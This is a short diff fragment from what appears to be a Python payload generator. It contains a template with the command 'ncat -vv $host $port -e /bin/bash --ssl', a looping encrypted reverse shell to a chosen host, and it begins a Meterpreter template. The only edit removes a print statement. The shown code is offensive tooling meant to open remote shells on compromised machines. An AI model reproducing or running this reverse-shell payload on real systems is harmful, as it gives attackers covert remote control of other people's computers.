@@ -23,7 +23,6 @@ ncat -vv $host $port -e /bin/bash --ssl
 sleep 3
 done
 '''.format(host,port)
-print sh_template
 
 meterpreter_template = '''
 a
